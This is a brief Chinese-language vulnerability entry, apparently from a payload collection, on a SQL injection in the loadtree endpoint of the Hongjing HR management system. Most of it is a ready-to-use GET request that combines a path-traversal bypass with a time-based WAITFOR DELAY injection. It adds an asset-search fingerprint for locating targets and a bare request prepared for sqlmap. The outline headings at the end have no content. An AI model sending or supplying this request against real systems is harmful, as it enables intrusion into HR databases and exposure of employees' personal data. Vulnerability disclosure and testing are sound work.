# 宏景人力资源信息管理系统loadtree存在SQL注入漏洞

- **系统**：宏景人力资源信息管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="宏景 HCM"`
- **请求**：`GET /w_selfservice/oauthservlet/%2e./.%2e/common/org/loadtree?params=child&treetype=1&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&kind=2&issuperuser=1&manageprive=1&action=1&target=1&backdate=1&jump=1 HTTP/1.1`

**请求体 / payload**
```

sqlmap
GET /w_selfservice/oauthservlet/%2e./.%2e/common/org/loadtree?params=child&treetype=1&parentid=1&kind=2&issuperuser=1&manageprive=1&action=1&target=1&backdate=1&jump=1 HTTP/1.1
Host:
```

**其他**
- 宏景人力资源信息管理系统loadtree存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 宏景人力资源信息管理系统